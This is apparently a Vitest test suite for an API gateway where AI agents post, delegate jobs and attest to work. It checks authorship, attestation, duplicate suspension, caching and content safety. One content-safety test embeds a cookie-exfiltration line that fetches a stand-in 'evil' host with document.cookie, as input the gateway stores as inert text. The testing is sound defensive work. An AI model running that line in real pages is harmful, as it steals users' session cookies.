/**
 * The gateway, end to end.
 *
 * These were ad-hoc probes driven through a browser console while building —
 * which found real bugs but left nothing behind. They are the same assertions,
 * run against the same in-process gateway, in a form that fails a build.
 *
 * The invariants below are the ones that make the network worth anything: an
 * agent cannot post as another agent, cannot vouch for its own work, cannot
 * inflate its own record, and cannot get code executed. Each is cheap to break
 * accidentally and impossible to notice by looking.
 */

import { beforeEach, describe, expect, it } from 'vitest';

import { MockRepository } from '@/data/mock/mockRepository';
import { DEV_KEYS } from '@/data/mock/credentials';
import { AgentGateway } from './agentGateway';
import { AgentReadGateway } from './agentReadGateway';
import { createRouter, parseUrl, type Router } from './httpRouter';

const QUILL = `Bearer ${DEV_KEYS.quill}`;
const SCOUT = `Bearer ${DEV_KEYS.scout}`;
const VERA = `Bearer ${DEV_KEYS.vera}`;

let repo: MockRepository;
let gateway: AgentGateway;
let read: AgentReadGateway;
let route: Router;

beforeEach(() => {
  repo = new MockRepository();
  gateway = new AgentGateway(repo.gatewayStore());
  read = new AgentReadGateway(repo.readStore());
  route = createRouter(gateway, read);
});

/** Long enough to clear the low-value floor, distinct enough to clear dedupe. */
const prose = (seed: string) =>
  `${seed} — recorded while working through this week's queue and worth writing down.`;

function call(method: string, url: string, body?: unknown, key?: string) {
  const { path, query } = parseUrl(url);
  return route({
    method,
    path,
    query,
    body,
    headers: key ? { authorization: key } : {},
  });
}

describe('authentication', () => {
  it('refuses a missing or malformed key', async () => {
    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: prose('a') })).status).toBe(401);
    expect(
      (await call('POST', '/api/agents/posts', { type: 'agent_post', content: prose('b') }, 'Bearer nope')).status,
    ).toBe(401);
  });

  it('leaves reading open — an agent should be able to evaluate the network first', async () => {
    expect((await call('GET', '/api/agents/feed?limit=2')).status).toBe(200);
    expect((await call('GET', '/api/agents/search?q=date')).status).toBe(200);
    expect((await call('GET', '/api/agents/profiles/Scout')).status).toBe(200);
  });
});

describe('authorship', () => {
  it('derives the author from the credential, never from the body', async () => {
    const res = await call(
      'POST',
      '/api/agents/posts',
      {
        type: 'agent_post',
        content: prose('Scout here, ignore my earlier list'),
        // Both ignored by construction — there is no field for them.
        authorId: 'agent_scout',
        authorType: 'agent',
        provenance: { mode: 'builder', actorId: 'builder_mohit' },
      },
      QUILL,
    );
    expect(res.status).toBe(200);

    const post = await read.readPost((res.body as { eventId: string }).eventId);
    expect(post?.post.author.tag).toBe('Quill#2215');
    expect(post?.post.provenance).toBe('autonomous');
  });

  it('refuses post types that are the platform\'s voice or somebody else\'s', async () => {
    for (const type of ['agent_verified', 'agent_joined', 'recommendation', 'builder_post']) {
      const res = await call('POST', '/api/agents/posts', { type, content: prose(type) }, QUILL);
      expect(res.status, type).toBe(422);
    }
  });
});

describe('evidence cannot be self-asserted', () => {
  it('requires a real job behind published work', async () => {
    const res = await call(
      'POST',
      '/api/agents/posts',
      { type: 'work_completed', content: prose('did lots'), headline: 'Did lots' },
      QUILL,
    );
    expect(res.status).toBe(422);
  });

  it('lets only the commissioning agent attest, and only once', async () => {
    const delegation = await call(
      'POST',
      '/api/agents/delegations',
      {
        target: 'Scout',
        title: 'Screen 200 founders',
        brief: 'CA fintech, 10-50 staff, series A or earlier, named founder required.',
        budgetCapMinor: 6000,
      },
      QUILL,
    );
    const delegationId = (delegation.body as { delegationId: string }).delegationId;

    await call('POST', '/api/agents/delegations/respond', { delegationId, action: 'accept' }, SCOUT);
    const job = await call('POST', '/api/agents/jobs', { title: 'Screened 200 founders', category: 'research' }, SCOUT);
    const jobId = (job.body as { jobId: string }).jobId;
    await call('POST', '/api/agents/delegations/complete', { delegationId, jobId }, SCOUT);

    // The agent that did the work cannot vouch for it.
    expect((await call('POST', '/api/agents/attestations', { delegationId, jobId, verdict: 'as_specified' }, SCOUT)).status).toBe(403);
    // The commissioner can.
    expect((await call('POST', '/api/agents/attestations', { delegationId, jobId, verdict: 'as_specified' }, QUILL)).status).toBe(200);
    // But not twice — attestations are final.
    expect((await call('POST', '/api/agents/attestations', { delegationId, jobId, verdict: 'partial', note: 'x' }, QUILL)).status).toBe(409);
  });

  it('counts the record from the ledger, with its denominator visible', async () => {
    const profile = await read.readProfile('Scout');
    expect(profile?.recordSummary).toMatch(/reported/);

    // No aggregate score anywhere on the profile. Matched on whole keys — a
    // looser pattern hits `operatingHours`, which contains "rating".
    const keys = new Set<string>();
    JSON.stringify(profile, (key, value) => (keys.add(key), value));
    for (const banned of ['rating', 'successRate', 'stars', 'score', 'averageRating']) {
      expect([...keys], banned).not.toContain(banned);
    }
  });
});

describe('content safety', () => {
  it('stores code as text and says so, rather than refusing it', async () => {
    const res = await call(
      'POST',
      '/api/agents/posts',
      {
        type: 'agent_post',
        content: 'Here is the parser I settled on.\n\n```js\nfetch("https://evil/"+document.cookie)\n```',
      },
      QUILL,
    );
    expect(res.status).toBe(200);
    expect((res.body as { containsSnippet: boolean }).containsSnippet).toBe(true);
  });

  it('refuses SVG outright and requires alt text', async () => {
    const media = (over: Record<string, unknown>) => [
      { id: 'm', url: 'https://cdn.example/a.png', mime: 'image/png', alt: 'A chart', origin: 'rendered', ...over },
    ];

    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: prose('svg'), media: media({ mime: 'image/svg+xml' }) }, QUILL)).status).toBe(422);
    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: prose('alt'), media: media({ alt: '' }) }, QUILL)).status).toBe(422);
    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: prose('http'), media: media({ url: 'http://cdn.example/a.png' }) }, QUILL)).status).toBe(422);
    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: prose('data'), media: media({ url: 'data:image/png;base64,AA' }) }, QUILL)).status).toBe(422);
    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: prose('ok'), media: media({}) }, QUILL)).status).toBe(200);
  });
});

describe('conduct', () => {
  it('escalates duplicates to a suspension, then blocks unrelated posts too', async () => {
    const dup = 'The renewal clause parser now reads notice periods in business days rather than calendar days.';

    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: dup }, VERA)).status).toBe(200);
    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: dup }, VERA)).status).toBe(409);
    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: `${dup} Confirmed.` }, VERA)).status).toBe(409);

    const suspended = await call('POST', '/api/agents/posts', { type: 'agent_post', content: `${dup} Again.` }, VERA);
    expect(suspended.status).toBe(423);

    // Suspension is not per-post: publishing stops entirely.
    expect((await call('POST', '/api/agents/posts', { type: 'agent_post', content: prose('unrelated subject') }, VERA)).status).toBe(423);
    // But reading still works — it can see why it was stopped.
    expect((await call('GET', '/api/agents/inbox', undefined, VERA)).status).toBe(200);
  });

  it('has no rate limit — volume is not the offence', async () => {
    for (let i = 0; i < 12; i += 1) {
      const res = await call('POST', '/api/agents/posts', { type: 'agent_post', content: prose(`distinct observation ${i}`) }, SCOUT);
      expect(res.status, `post ${i}`).toBe(200);
    }
  });
});

describe('idempotency', () => {
  it('replays rather than double-publishing', async () => {
    const body = { type: 'agent_post', content: prose('retried after a crash') };
    const { path } = parseUrl('/api/agents/posts');
    const send = () =>
      route({ method: 'POST', path, body, headers: { authorization: QUILL, 'idempotency-key': 'k-1' } });

    const first = await send();
    const second = await send();
    expect((first.body as { eventId: string }).eventId).toBe((second.body as { eventId: string }).eventId);
  });
});

describe('reading', () => {
  it('pages with a cursor and never repeats an item', async () => {
    const page1 = await call('GET', '/api/agents/feed?limit=5');
    const body1 = page1.body as { posts: { id: string }[]; nextCursor?: string };
    expect(body1.posts).toHaveLength(5);

    const page2 = await call('GET', `/api/agents/feed?limit=5&cursor=${encodeURIComponent(body1.nextCursor!)}`);
    const body2 = page2.body as { posts: { id: string }[] };

    const overlap = body2.posts.filter((p) => body1.posts.some((q) => q.id === p.id));
    expect(overlap).toHaveLength(0);
  });

  it('returns nothing for a poll that is caught up', async () => {
    const first = await call('GET', '/api/agents/feed?limit=5');
    const latestAt = (first.body as { latestAt: string }).latestAt;

    const poll = await call('GET', `/api/agents/feed?since=${encodeURIComponent(latestAt)}`);
    expect((poll.body as { posts: unknown[] }).posts).toHaveLength(0);
  });

  it('caches public reads and never caches authenticated ones', async () => {
    const feed = await call('GET', '/api/agents/feed?limit=3');
    expect(feed.headers?.['Cache-Control']).toContain('s-maxage');

    const inbox = await call('GET', '/api/agents/inbox', undefined, QUILL);
    expect(inbox.headers?.['Cache-Control']).toBe('private, no-store');
  });

  it('answers 304 when a poller sends back the ETag', async () => {
    const first = await call('GET', '/api/agents/feed?limit=3');
    const { path, query } = parseUrl('/api/agents/feed?limit=3');
    const again = await route({
      method: 'GET',
      path,
      query,
      headers: { 'if-none-match': first.headers!.ETag },
    });
    expect(again.status).toBe(304);
    expect(again.body).toBeNull();
  });
});

describe('routing', () => {
  it('maps error codes to statuses a client can act on', async () => {
    expect((await call('GET', '/api/agents/nothing')).status).toBe(404);
    expect((await call('DELETE', '/api/agents/feed')).status).toBe(405);
    expect((await call('GET', '/api/agents/threads/no-such-thread%230001')).status).toBe(404);
  });
});
